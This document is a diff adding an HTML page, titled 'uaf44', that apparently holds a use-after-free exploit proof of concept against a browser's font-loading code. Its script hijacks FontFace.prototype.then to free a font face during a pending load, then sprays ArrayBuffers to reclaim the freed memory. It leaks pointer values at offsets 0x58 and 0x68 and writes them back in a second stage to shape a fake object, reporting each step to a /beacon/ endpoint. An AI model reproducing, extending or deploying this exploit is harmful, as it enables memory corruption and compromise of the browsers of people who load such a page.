@@ -1,0 +1,70 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf44</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+/* p565's spray shape: 16 x 192 only, sheet reference dropped, one stage per getter */
+var U = Date.now().toString(36);
+var K = 16, SIZE = 192, stage = 0, styleEl = null, MAP = [], HIT = null;
+function mkFace(tag){
+  var fam = 's'+U+'x'+tag, nm = 'f'+U+'x'+tag;
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  var A = new FontFace(nm, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  (window.__alive = window.__alive || []).push(A);
+  return fam;
+}
+function findHit(){
+  for (var i=0;i<MAP.length;i++){
+    var u=MAP[i].view;
+    if (u[0x58]||u[0x59]||u[0x5A]||u[0x5B]) { HIT=u; return i; }
+  }
+  return -1;
+}
+function start(tag){
+  stage = tag;
+  var fam = mkFace(tag);
+  document.fonts.load('1em f'+U+'x'+tag+', '+fam, 'AB').then(function(){
+    b('U44-ST'+tag+'-RESOLVED');
+    if (tag===1) setTimeout(function(){ if (HIT) start(2); else b('U44-ABORT-NOHIT'); }, 30);
+  }, function(){ b('U44-ST'+tag+'-REJECTED'); });
+}
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function(){
+    if (stage===0) return undefined;
+    var st = stage; stage = 0;
+    if (styleEl) { styleEl.remove(); styleEl = null; }
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    MAP = [];
+    for (var k=0;k<K;k++){
+      var ab = new ArrayBuffer(SIZE);
+      MAP.push({ view: new Uint8Array(ab) });
+    }
+    if (st===1){
+      try { document.fonts.check('1em s'+U+'x1'); } catch(e) {}
+      var i = findHit();
+      if (i<0) { b('U44-ST1-NOHIT-'+K); return undefined; }
+      b('U44-ST1-HIT-b'+i+'-58:'+hex8(HIT,0x58)+'-68:'+hex8(HIT,0x68));
+      return undefined;
+    }
+    /* stage 2: same shape, buffers pre-shaped with the leaked pointers */
+    for (var j=0;j<MAP.length;j++){
+      var u2=MAP[j].view;
+      u2[0]=1;
+      if (HIT) { u2.set(HIT.subarray(0x58,0x60),0x58); u2.set(HIT.subarray(0x68,0x70),0x68); }
+    }
+    b('U44-ST2-TEMPLATE');
+    try { document.fonts.check('1em s'+U+'x2'); } catch(e) {}
+    b('U44-ST2-CHECK-RETURNED');
+    return undefined;
+  },
+  set: function(){}
+});
+function run(){ b('U44-PARSE-'+U); start(1); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>uaf44</p></body></html>
